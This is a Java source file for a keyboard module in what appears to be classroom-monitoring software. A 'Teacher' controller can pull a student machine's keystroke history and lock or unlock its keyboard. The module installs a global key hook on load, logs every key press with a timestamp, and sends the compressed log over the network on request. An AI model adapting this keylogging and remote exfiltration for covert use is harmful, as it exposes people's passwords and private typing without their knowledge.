package com.godpalace.student.module;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.godpalace.student.Teacher;
import com.godpalace.student.ThreadPoolManager;
import lombok.extern.slf4j.Slf4j;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.nio.ByteBuffer;
import java.util.Date;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.zip.GZIPOutputStream;

@Slf4j
public class KeyboardModule implements Module {
    private static final short GET_KEYBOARD_RECORD = 0x01;
    private static final short DISABLE_KEYBOARD    = GET_KEYBOARD_RECORD + 1;
    private static final short ENABLE_KEYBOARD     = DISABLE_KEYBOARD + 1;

    private static final ConcurrentLinkedQueue<KeyboardData> keyboardData =
            new ConcurrentLinkedQueue<>();

    private static native void DisableKeyboard();
    private static native void EnableKeyboard();

    static  {
        // 注册全局键盘监听
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            log.error("Failed to register global keyboard listener.", e);
        }

        // 监听键盘事件
        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
                Date date = new Date();
                int key = nativeEvent.getKeyCode();
                keyboardData.add(new KeyboardData(date, key));
            }
        });

        // 定时清理键盘记录
        ThreadPoolManager.getExecutor().execute(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        synchronized (this) {
                            wait(5000);
                        }

                        if (keyboardData.size() > 300) {
                            keyboardData.clear();
                        }
                    } catch (Exception e) {
                        log.error("Failed to execute keyboard record task.", e);
                        break;
                    }
                }
            }
        });

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            // 关闭时注销全局键盘监听
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (Exception e) {
                log.error("Failed to unregister global keyboard listener.", e);
            }

            // 启用键盘
            EnableKeyboard();
        }));

        log.debug("Global keyboard listener registered.");
    }

    @Override

    public short getID() {
        return 0x06;
    }

    @Override
    public String getName() {
        return "KeyboardModule";
    }

    @Override
    public void execute(Teacher teacher, ByteBuffer data) throws Exception {
        switch (data.getShort()) {
            case GET_KEYBOARD_RECORD -> {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                GZIPOutputStream gzipOut = new GZIPOutputStream(out);
                ObjectOutputStream objOut = new ObjectOutputStream(gzipOut);

                for (KeyboardData keyboardDatum : keyboardData) {
                    keyboardDatum.writeToStream(objOut);
                }

                objOut.flush();
                gzipOut.finish();
                gzipOut.flush();
                out.flush();

                ByteBuffer buffer = ByteBuffer.allocate(out.size() + 4);
                buffer.putInt(keyboardData.size());
                buffer.put(out.toByteArray());
                buffer.flip();

                sendResponseWithSize(teacher.getChannel(), buffer);

                objOut.close();
                gzipOut.close();
                out.close();
            }

            case DISABLE_KEYBOARD -> DisableKeyboard();
            case ENABLE_KEYBOARD -> EnableKeyboard();
        }
    }

    @Override
    public boolean isLocalModule() {
        return false;
    }

    record KeyboardData(Date date, int key) {
        public void writeToStream(ObjectOutputStream out) throws IOException {
            out.writeObject(date);
            out.writeInt(key);
        }
    }
}
